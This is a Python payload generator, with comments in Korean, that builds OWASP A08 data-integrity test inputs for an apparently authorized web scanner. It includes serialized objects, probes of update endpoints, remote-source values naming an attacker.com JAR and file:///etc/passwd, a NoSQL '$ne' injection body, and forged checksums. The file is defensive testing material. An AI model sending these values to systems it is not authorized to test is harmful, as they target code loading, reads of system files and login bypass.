# =============================================================================
# payloads/owasp/payload_generator.py
# OWASP Top 10 2021 — W-1-6 "입력값 크기 및 무결성 검증오류" 전용 페이로드
#
# 포함 항목:
#   A08:2021 – Software and Data Integrity Failures
#              (역직렬화, 무결성 미검증 데이터, 공급망 무결성 등)
#
# 제외 (다른 팀원 모듈):
#   A01 접근제어, A02 암호화, A03 인젝션, A04 설계결함, A05 설정오류,
#   A06 취약 컴포넌트, A07 인증실패, A09 로깅, A10 SSRF
#
# 주의: 반드시 허가된 테스트 환경에서만 실행하세요.
# =============================================================================

import base64
import logging

logger = logging.getLogger(__name__)
SOURCE_TAG = "owasp"

OWASP_ID   = "A08:2021"
OWASP_NAME = "Software and Data Integrity Failures"


class OWASPPayloadGenerator:
    """
    W-1-6 전용 OWASP Top 10 페이로드 생성기.
    A08:2021 Software and Data Integrity Failures 단독 커버.

    페이로드 딕셔너리:
        source      : "owasp"
        owasp_id    : "A08:2021"
        owasp_name  : "Software and Data Integrity Failures"
        attack_vector: body | header | query
        name        : 고유 이름
        value/body  : 페이로드
    """

    # =========================================================================
    # A08:2021 — 역직렬화 (Insecure Deserialization)
    # =========================================================================
    @staticmethod
    def a08_deserialization_payloads() -> list:
        """
        A08: 다양한 직렬화 형식으로 무결성 검증 우회 시도.
        Java / Python / PHP / .NET / YAML / JSON 커버.
        """
        payloads = []

        # --- Java ---
        java_raw = [
            # Integer 오브젝트
            (b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer"
             b"\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I"
             b"\x00\x05valuexr\x00\x10java.lang.Number"
             b"\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01",
             "java_integer"),
            # HashMap 오브젝트
            (b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap"
             b"\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F"
             b"\x00\nloadFactorI\x00\tthresholdxp?\x40\x00"
             b"\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10"
             b"\x00\x00\x00\x00x", "java_hashmap"),
            # 빈 ArrayList
            (b"\xac\xed\x00\x05sr\x00\x13java.util.ArrayList"
             b"\x78\x01\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01I"
             b"\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00x",
             "java_arraylist_empty"),
        ]
        for raw, name in java_raw:
            b64val = base64.b64encode(raw).decode()
            # body: base64 인코딩
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_java_{name}_body",
                "body": {"data": b64val, "_type": "java.io.Serializable"}
            })
            # header: Content-Type 변조
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "header",
                "name": f"a08_java_{name}_header",
                "headers": {
                    "Content-Type": "application/x-java-serialized-object",
                    "X-Java-Deserialized": b64val,
                }
            })

        # --- Python pickle ---
        pickle_raw = [
            (b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.", "v4_empty"),
            (b"\x80\x02\x5d\x71\x00.",                           "v2_list"),
            (b"\x80\x02}q\x00.",                                  "v2_dict"),
            (b"\x80\x02K\x01.",                                   "v2_int1"),
            (b"\x80\x02\x8c\x04test\x94.",                        "v2_str"),
        ]
        for raw, name in pickle_raw:
            b64val = base64.b64encode(raw).decode()
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_pickle_{name}",
                "body": {"data": b64val, "format": "pickle", "encoding": "base64"}
            })

        # --- PHP unserialize ---
        php_strings = [
            ('O:8:"stdClass":0:{}',             "stdclass_empty"),
            ('a:0:{}',                           "array_empty"),
            ('a:1:{i:0;s:4:"test";}',           "array_str"),
            ('O:8:"stdClass":1:{s:3:"key";i:1;}', "stdclass_int"),
            ('s:4:"test";',                      "string"),
            ('i:0;',                             "int_zero"),
            ('b:1;',                             "bool_true"),
            ('N;',                               "null"),
        ]
        for php_str, name in php_strings:
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_php_{name}",
                "body": {"data": php_str, "format": "php_serialize"}
            })

        # --- .NET BinaryFormatter (SOAP/binary) ---
        dotnet_payloads = [
            # SOAP 형식 힌트
            ("<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
             "<SOAP-ENV:Body><System.String>test</System.String></SOAP-ENV:Body>"
             "</SOAP-ENV:Envelope>",
             "dotnet_soap_string"),
            # ViewState 변조 (Base64 빈 값)
            (base64.b64encode(b"\xff\x01\x00\x00\x00\xff\xff\xff\xff").decode(),
             "dotnet_viewstate_magic"),
        ]
        for val, name in dotnet_payloads:
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_{name}",
                "body": {"__VIEWSTATE": val, "data": val}
            })

        logger.debug(f"[OWASP] A08 역직렬화: {len(payloads)}개")
        return payloads

    # =========================================================================
    # A08:2021 — 무결성 미검증 업데이트/다운로드 경로
    # =========================================================================
    @staticmethod
    def a08_integrity_check_paths() -> list:
        """
        A08: 서버가 데이터 무결성을 검증하지 않는 경로 탐색.
        업데이트/패치/설정 파일 배포 엔드포인트 대상.
        """
        payloads = []

        # 무결성 검증 없는 업데이트 수신 경로
        update_paths = [
            "/update",         "/upgrade",
            "/api/update",     "/api/upgrade",
            "/api/v1/update",  "/api/v2/update",
            "/admin/update",   "/admin/patch",
            "/deploy",         "/api/deploy",
            "/reload",         "/api/reload",
            "/api/config/reload",
        ]
        for path in update_paths:
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "url",
                "name": f"a08_update_path_{path.strip('/').replace('/','_') or 'root'}",
                "url_path": path
            })

        # 무결성 없는 원격 리소스 수신 — URL 파라미터로 검사
        for param in ["source", "plugin", "package", "module", "lib", "library"]:
            for src in ["http://attacker.com/evil.jar", "file:///etc/passwd",
                        "http://127.0.0.1:8080/evil"]:
                safe_src = src[:25].replace("://","_").replace("/","_").replace(".","_")
                payloads.append({
                    "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                    "attack_vector": "body",
                    "name": f"a08_remote_src_{param}_{safe_src}",
                    "body": {param: src}
                })

        logger.debug(f"[OWASP] A08 무결성 경로: {len(payloads)}개")
        return payloads

    # =========================================================================
    # A08:2021 — JSON/XML 무결성 검증 부재 (타입 혼동)
    # =========================================================================
    @staticmethod
    def a08_data_integrity_payloads() -> list:
        """
        A08: 입력 데이터 무결성 검증 부재.
        타입 혼동, 예상치 못한 구조로 무결성 검사 우회.
        """
        payloads = []

        # JSON 타입 혼동 — 서버가 타입을 검증하지 않을 때
        type_confusion_cases = [
            # 문자열 필드에 오브젝트 삽입
            ({"username": {"$ne": None}, "password": "anything"}, "json_obj_in_str"),
            # 배열로 단일 값 대체
            ({"username": ["admin", "user"], "password": "test"}, "json_array_in_str"),
            # 숫자 필드에 문자열
            ({"amount": "999999", "currency": "KRW"},             "str_in_number"),
            # null 삽입
            ({"data": None, "checksum": None, "signature": None}, "all_null"),
            # 빈 오브젝트
            ({"payload": {}, "integrity": {}},                    "empty_objects"),
            # 중첩 깊이 폭탄 (무결성 파서 오류 유발)
            ({"a": {"b": {"c": {"d": {"e": {"f": {"g": "deep"}}}}}}}, "nested_7_deep"),
        ]
        for body, name in type_confusion_cases:
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_type_confusion_{name}", "body": body
            })

        # 체크섬/서명 위조 시도
        signature_bypass = [
            ({"data": "malicious", "checksum": "00000000"},       "zero_checksum"),
            ({"data": "malicious", "checksum": ""},               "empty_checksum"),
            ({"data": "malicious", "signature": "invalid"},       "invalid_sig"),
            ({"data": "malicious", "hmac": "A" * 64},             "fake_hmac_sha256"),
            ({"data": "malicious", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, "md5_empty"),
        ]
        for body, name in signature_bypass:
            payloads.append({
                "source": SOURCE_TAG, "owasp_id": OWASP_ID, "owasp_name": OWASP_NAME,
                "attack_vector": "body",
                "name": f"a08_sig_bypass_{name}", "body": body
            })

        logger.debug(f"[OWASP] A08 데이터 무결성: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 전체 반환
    # =========================================================================
    def get_all_payloads(self) -> list:
        """W-1-6 전용 OWASP A08:2021 전체 페이로드 반환."""
        all_payloads = (
            self.a08_deserialization_payloads()
            + self.a08_integrity_check_paths()
            + self.a08_data_integrity_payloads()
        )
        logger.info(f"[OWASP W-1-6 A08:2021] 전체 페이로드: {len(all_payloads)}개")
        return all_payloads
